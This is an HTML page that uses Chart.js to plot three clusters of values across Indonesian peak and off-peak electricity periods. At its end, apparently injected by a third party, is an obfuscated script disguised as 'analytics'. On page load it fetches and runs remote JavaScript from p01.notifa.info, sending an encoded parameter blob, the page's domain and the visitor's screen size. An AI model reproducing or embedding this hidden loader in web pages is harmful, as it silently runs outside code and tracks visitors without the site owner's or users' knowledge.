<!doctype html>
<html>

<head>
	<title>Grid Lines Display Settings</title>
	<script src="Chart.bundle.js"></script>
	<script src="utils.js"></script>
	<style>
		canvas{
			-moz-user-select: none;
			-webkit-user-select: none;
			-ms-user-select: none;
		}
		.chart-container {
			width: 500px;
			margin-left: 40px;
			margin-right: 40px;
			margin-bottom: 40px;
		}
		.container {
			display: flex;
			flex-direction: row;
			flex-wrap: wrap;
			justify-content: center;
		}
	</style>
</head>

<body>
	<div class="container"></div>
	<script>
		function createConfig(gridlines, title) {
			return {
				type: 'line',
				data: {
					labels: ['WBP Hari I', 'LWBP I', 'WBP II', 'LWBP II', 'WBP III', 'LWBP III', 'WBP IV', 'LWBP IV', 'WBP V', 'LWBP V', 'WBP VI', 'LWBP VI', 'WBP VII', 'LWBP VII'],
					datasets: [{
						label: 'Pola Pertama(C1)', 
						backgroundColor: window.chartColors.red,
						borderColor: window.chartColors.red,
						data: [0.55611111111111,0.55177777777778 ,0.72077777777778 , 0.66444444444444, 0.72811111111111 ,0.69377777777778 , 0.67611111111111 ,0.64855555555556,.73311111111111 , 0.65077777777778 ,0.68188888888889 , 0.67966666666667 ,0.39666666666667 , 0.48888888888889],
						fill: false,
					}, {
						label: 'Pola Kedua(C2)',
						fill: false,
						backgroundColor: window.chartColors.blue,
						borderColor: window.chartColors.blue,
						data: [0.28791666666667, 0.24816666666667, 0.31516666666667, 0.26566666666667, 0.31883333333333, 0.27291666666667, 0.31158333333333,0.27175,0.32025,0.27,0.29575,0.27533333333333, 0.294, 0.27358333333333],
					},  {
						label: 'Pola Ketiga(C3)',
						fill: false,
						backgroundColor: window.chartColors.yellow,
						borderColor: window.chartColors.yellow,
						data: [0.10329268292683, 0.085024390243902, 0.13081707317073, 0.14420731707317, 0.13157317073171, 0.14724390243902, 0.12890243902439, 0.14476829268293, 0.13023170731707,  0.14615853658537, 0.13578048780488, 0.1489512195122, 0.1074512195122, 0.098634146341463 ],
					}]
				},
				options: {
					responsive: true,
					title: {
						display: true,
						text: title
					},
					scales: {
						xAxes: [{
							gridLines: gridlines
						}],
						yAxes: [{
							gridLines: gridlines,
							ticks: {
								min: 0,
								max: 1.5,
								stepSize: 0.25
							}
						}]
					}
				}
			};
		}

		window.onload = function() {
			var container = document.querySelector('.container');

			[{
				title: 'Display: true',
				gridLines: {
					display: true
				}
			}].forEach(function(details) {
				var div = document.createElement('div');
				div.classList.add('chart-container');

				var canvas = document.createElement('canvas');
				div.appendChild(canvas);
				container.appendChild(div);

				var ctx = canvas.getContext('2d');
				var config = createConfig(details.gridLines, details.title);
				new Chart(ctx, config);
			});
		};
	</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mxhwH7L48spq3WEcGnlpD49Jzpt0nnf%2bbrmnnbdZ86e%2bQiLpSJejBtQ1oD5%2bqUK1MnuGfHtSl1kmfOTSx1s2hRm0ae729BKg4Tw21YDvqFpjRP%2fImn%2f7GNqWco%2buDQuAdAE7OIIttkdQLImfBUec4CfXQ8zr8fBdS3ZZvbV5Y3qIZBKgsqzbT9aeIY22oZ50dy6sQLROFepXhA5Say4jnJwkyeorqKINnGldEJWyiIuEla9NirR%2b3qX7ZzMmN1W45faUiaM%2fH6Q%2b2YkxikXOmPP0bxrW%2bJf8x3ct7SjCB8CH%2bZ6H67sPRLHZ9Mze4olKzP0Lzfd0Dtp5KtoOJTnzAyeUYyoXT7MPou8yZCA8Q00oxIz3smzpx4m4gfGVpCD0ZykPGk%2f2Qjxo7KclALrj%2bBynLwnsEy5vMgtVny8X44yvimzktEYyIXimPe1HNkCix12innC2%2fA5YMbeTNE0ZzszywqXO6HGognDnMcWrGm%2fQNPkocbTm1IbaeZsDrR0PjN8HaW%2bFm05gDZlghtywPnE9Cca94DrkO4iTfL0vu9Vhjwv9xW61LaCI5TOOAQTZoQiJrDPbNlL7ThqNJNpOSlDCA6T0tV%2bQT" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>
